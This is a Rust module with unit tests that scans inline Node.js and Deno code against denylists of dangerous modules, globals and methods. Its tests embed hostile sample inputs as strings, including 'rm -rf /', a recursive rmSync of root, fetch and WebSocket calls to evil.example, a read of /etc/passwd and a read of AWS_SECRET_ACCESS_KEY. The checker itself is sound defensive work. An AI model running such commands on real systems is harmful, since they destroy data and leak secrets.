//! Heuristic safety analysis for inline Node.js / JavaScript source code.
//!
//! Scans for dangerous `require()` calls, globals, and method calls. Also shared by the
//! `deno` handler (`src/handlers/node.rs`): Deno exposes its filesystem/process/network/FFI
//! API as a bare `Deno.*` global with no `require()`/`import` checkpoint the way Node's
//! modules have, so it needs its own enumerated denylist (`DANGEROUS_DENO_GLOBALS`) rather
//! than reusing the Node-idiom lists (see #186).
//! Returns `true` if no dangerous patterns are found.

const DANGEROUS_REQUIRES: &[&str] = &[
    "child_process",
    "fs",
    "net",
    "dgram",
    "http",
    "https",
    "os",
    "cluster",
    "vm",
    "worker_threads",
];

const DANGEROUS_GLOBALS: &[&str] = &[
    "eval(",
    "Function(",
    "process.exit(",
    "process.kill(",
    "process.env",
    "process.binding(",
    "child_process",
    // Network egress: the `fetch`/`WebSocket` globals (built in since Node 18)
    // reach the network without importing `http`/`net`, so they must be gated
    // the same way (see #149 follow-up). `import(` is dynamic import, an
    // arbitrary-module / code-loading vector that bypasses the static
    // `require(...)`/`from '...'` module checks.
    "fetch(",
    "WebSocket",
    "XMLHttpRequest",
    "import(",
];

// Deno's built-in global namespace — see the module doc comment for why this list
// exists separately from `DANGEROUS_GLOBALS`.
const DANGEROUS_DENO_GLOBALS: &[&str] = &[
    "Deno.run(",
    "Deno.Command(",
    "Deno.remove(",
    "Deno.removeSync(",
    "Deno.write(",
    "Deno.writeSync(",
    "Deno.writeFile(",
    "Deno.writeFileSync(",
    "Deno.writeTextFile(",
    "Deno.writeTextFileSync(",
    "Deno.open(",
    "Deno.openSync(",
    "Deno.create(",
    "Deno.createSync(",
    "Deno.env",
    "Deno.readFile(",
    "Deno.readFileSync(",
    "Deno.readTextFile(",
    "Deno.readTextFileSync(",
    "Deno.connect(",
    "Deno.connectTls(",
    "Deno.listen(",
    "Deno.serve(",
    "Deno.dlopen(",
    "Deno.exit(",
    "Deno.kill(",
    "Deno.mkdir(",
    "Deno.mkdirSync(",
    "Deno.rename(",
    "Deno.renameSync(",
    "Deno.chmod(",
    "Deno.chmodSync(",
    "Deno.symlink(",
    "Deno.symlinkSync(",
    "Deno.copyFile(",
    "Deno.copyFileSync(",
    "Deno.truncate(",
    "Deno.truncateSync(",
];

const DANGEROUS_METHODS: &[&str] = &[
    ".execSync(",
    ".spawnSync(",
    ".exec(",
    ".spawn(",
    ".fork(",
    ".writeFileSync(",
    ".writeFile(",
    ".unlinkSync(",
    ".unlink(",
    ".rmSync(",
    ".rmdirSync(",
    ".renameSync(",
    ".mkdirSync(",
    ".appendFileSync(",
    ".createWriteStream(",
];

/// Check whether inline Node.js source appears safe to execute.
///
/// This is a heuristic check — it may have false positives (blocking safe code)
/// but should not have false negatives (allowing dangerous code).
#[must_use]
pub(crate) fn is_node_source_safe(source: &str) -> bool {
    !has_dangerous_requires(source)
        && !has_dangerous_globals(source)
        && !has_dangerous_methods(source)
}

fn has_dangerous_requires(source: &str) -> bool {
    for module in DANGEROUS_REQUIRES {
        // require("module") or require('module')
        if source.contains(&format!("require(\"{module}\")"))
            || source.contains(&format!("require('{module}')"))
        {
            return true;
        }
        // import ... from "module" (ES modules)
        if source.contains(&format!("from \"{module}\""))
            || source.contains(&format!("from '{module}'"))
        {
            return true;
        }
    }
    false
}

fn has_dangerous_globals(source: &str) -> bool {
    DANGEROUS_GLOBALS.iter().any(|g| source.contains(g))
        || DANGEROUS_DENO_GLOBALS.iter().any(|g| source.contains(g))
}

fn has_dangerous_methods(source: &str) -> bool {
    DANGEROUS_METHODS.iter().any(|m| source.contains(m))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn console_log_is_safe() {
        assert!(is_node_source_safe("console.log('hello')"));
    }

    #[test]
    fn math_is_safe() {
        assert!(is_node_source_safe("console.log(Math.sqrt(16))"));
    }

    #[test]
    fn json_parse_is_safe() {
        assert!(is_node_source_safe("JSON.parse('{\"a\":1}')"));
    }

    #[test]
    fn empty_source_is_safe() {
        assert!(is_node_source_safe(""));
    }

    #[test]
    fn array_operations_safe() {
        assert!(is_node_source_safe("[1,2,3].map(x => x * 2)"));
    }

    #[test]
    fn require_child_process_is_dangerous() {
        assert!(!is_node_source_safe(
            "require('child_process').execSync('ls')"
        ));
    }

    #[test]
    fn require_fs_is_dangerous() {
        assert!(!is_node_source_safe("require('fs').readFileSync('/')"));
    }

    #[test]
    fn require_net_is_dangerous() {
        assert!(!is_node_source_safe("require('net')"));
    }

    #[test]
    fn require_os_is_dangerous() {
        assert!(!is_node_source_safe("require('os').homedir()"));
    }

    #[test]
    fn require_double_quotes_is_dangerous() {
        assert!(!is_node_source_safe(
            "require(\"child_process\").exec('ls')"
        ));
    }

    #[test]
    fn import_from_fs_is_dangerous() {
        assert!(!is_node_source_safe("import { readFileSync } from 'fs'"));
    }

    #[test]
    fn eval_is_dangerous() {
        assert!(!is_node_source_safe("eval('code')"));
    }

    #[test]
    fn function_constructor_is_dangerous() {
        assert!(!is_node_source_safe("new Function('return 1')()"));
    }

    #[test]
    fn process_exit_is_dangerous() {
        assert!(!is_node_source_safe("process.exit(1)"));
    }

    #[test]
    fn process_env_is_dangerous() {
        assert!(!is_node_source_safe("console.log(process.env)"));
    }

    #[test]
    fn exec_sync_is_dangerous() {
        assert!(!is_node_source_safe("cp.execSync('rm -rf /')"));
    }

    #[test]
    fn write_file_sync_is_dangerous() {
        assert!(!is_node_source_safe("fs.writeFileSync('/tmp/x', 'data')"));
    }

    #[test]
    fn unlink_sync_is_dangerous() {
        assert!(!is_node_source_safe("fs.unlinkSync('/tmp/x')"));
    }

    #[test]
    fn rm_sync_is_dangerous() {
        assert!(!is_node_source_safe("fs.rmSync('/', { recursive: true })"));
    }

    #[test]
    fn require_vm_is_dangerous() {
        assert!(!is_node_source_safe("require('vm').runInNewContext('1')"));
    }

    #[test]
    fn fetch_global_is_dangerous() {
        // fetch (Node 18+) is egress that bypasses require('http')/('net') checks.
        assert!(!is_node_source_safe(
            "fetch('http://evil.example/?d='+Date.now())"
        ));
    }

    #[test]
    fn dynamic_import_is_dangerous() {
        assert!(!is_node_source_safe("import('child_process')"));
        assert!(!is_node_source_safe("import('node:fs')"));
    }

    #[test]
    fn websocket_is_dangerous() {
        assert!(!is_node_source_safe("new WebSocket('ws://evil.example')"));
    }

    #[test]
    fn process_binding_is_dangerous() {
        assert!(!is_node_source_safe("process.binding('spawn_sync')"));
    }

    #[test]
    fn static_import_of_safe_binding_is_still_safe() {
        // Static `import` (no paren) of nothing dangerous stays safe; only the
        // dynamic `import(` form is treated as a code-loading vector.
        assert!(is_node_source_safe("const x = 1; console.log(x)"));
    }

    #[test]
    fn deno_remove_sync_is_dangerous() {
        assert!(!is_node_source_safe("Deno.removeSync('/tmp/x')"));
    }

    #[test]
    fn deno_run_is_dangerous() {
        assert!(!is_node_source_safe("Deno.run({cmd:['id']})"));
    }

    #[test]
    fn deno_command_is_dangerous() {
        assert!(!is_node_source_safe("new Deno.Command('id').outputSync()"));
    }

    #[test]
    fn deno_env_get_is_dangerous() {
        assert!(!is_node_source_safe(
            "console.log(Deno.env.get('AWS_SECRET_ACCESS_KEY'))"
        ));
    }

    #[test]
    fn deno_read_text_file_sync_is_dangerous() {
        assert!(!is_node_source_safe("Deno.readTextFileSync('/etc/passwd')"));
    }

    #[test]
    fn deno_connect_is_dangerous() {
        assert!(!is_node_source_safe(
            "Deno.connect({hostname:'evil.example',port:80})"
        ));
    }

    #[test]
    fn deno_serve_is_dangerous() {
        assert!(!is_node_source_safe("Deno.serve(() => new Response('hi'))"));
    }

    #[test]
    fn deno_dlopen_is_dangerous() {
        assert!(!is_node_source_safe("Deno.dlopen('/tmp/lib.so', {})"));
    }

    #[test]
    fn deno_exit_is_dangerous() {
        assert!(!is_node_source_safe("Deno.exit(1)"));
    }

    #[test]
    fn deno_args_and_cwd_are_safe() {
        // Not in the denylist -- proves the fix doesn't blanket-block `Deno.*`.
        assert!(is_node_source_safe("console.log(Deno.args)"));
        assert!(is_node_source_safe("console.log(Deno.cwd())"));
    }
}
